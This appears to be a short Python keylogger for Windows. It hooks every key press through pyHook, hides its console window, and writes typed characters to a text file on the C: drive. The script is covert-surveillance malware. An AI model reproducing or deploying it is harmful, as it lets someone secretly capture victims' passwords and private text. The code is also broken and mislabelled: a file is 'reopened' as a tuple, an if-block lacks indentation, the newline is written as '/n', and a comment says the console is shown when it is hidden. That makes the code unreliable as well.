

#Walk to the library, obtain the books to create the Python application.

import win32api
import win32console
import win32gui
import pythoncom, pyHook #<---Is the class library for the keyboard.

#Show the Console window the screen. 
win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)


def OnKeyboardEvent(event): 


	if event.Ascii==5:
		_exit(1)


	if event.Ascii !=0 or 8:

		f = open('c:\output.txt', 'r+') #<--Open the path file as a text file and input the keyboard text. 


		buffer = f.read()

		f.close() #<--Close the file on the operating system when the user stops typing

	#Reopen the text file when the user starts typing again on the keyboard.
		f = ('c:\output.txt', 'w')

		keylogs = chr(event.Ascii)

		if event.Ascii == 13:

		keylogs = '/n' #<----Start a new line in the text file. 

		buffer += keylogs

		f.write(buffer)
		f.close() 

#Create a hook for the manager object

hm = pyHook.HookManager() #<---Referencing the class library that was implementedn 
hm.KeyDown = OnKeyboardEvent #<---Everytime you press on the keyboard, run the function of logging the events in a text file.

#Set the hook 
hm.HookKeyboard()

#Wait forever
pythoncom.PumpMessages()





